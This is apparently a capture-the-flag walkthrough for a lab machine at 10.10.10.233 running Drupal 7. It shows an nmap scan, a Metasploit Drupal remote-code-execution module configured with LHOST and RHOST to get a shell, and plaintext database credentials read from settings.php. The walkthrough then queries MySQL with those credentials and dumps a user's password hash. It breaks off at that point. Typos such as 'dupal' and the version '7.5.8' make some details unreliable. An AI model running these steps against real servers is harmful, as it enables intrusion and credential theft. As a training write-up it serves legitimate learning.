First start with a nmap scant to 10.10.10.233

	sudo nmap -sC -sV -oA nmap_ready 10.10.10.233

We can see that there is a webserver running on port 80. Doing a get request with the browser we can see that there is somekind of login option in the main page.

The nmap scan and wappalyzer tells us that the webserver is using drupal 7.

By searching in exploit database for dupal, we can see that there is a remote code exploit in version 7.5.8 and this exploit is in metasploit

Using metasploit

	msfconsole -q
	search drupal 7.5.8
	use 4
	show option
	set LHOST 10.10.14.230
	set RHOST 10.10.10.233
	run

Now we have access to the webserver.

By going to sites/default we can find the server configuratons in settings.php. In this file we can find a user and password for the database

	user:drupaluser
	pass:CQHEy@9M*m23gBVj

We can use the shell command to get a shell and then do a mysql query

	shell
	mysql -u drupaluser -pCQHEy@9M*m23gBVj -D drupal -e 'show databases'
	mysql -u drupaluser -pCQHEy@9M*m23gBVj -D drupal -e 'show tables'
	mysql -u drupaluser -pCQHEy@9M*m23gBVj -D drupal -e 'select * from users'

In this table we can see the user:

	│brucetherealadmin       S$DX9LiDOVbR2r5.LdRzE42sb4QDNdmnU2Bctsd26IZ.enRllaJUyR

Which is an user of /etc/passwd


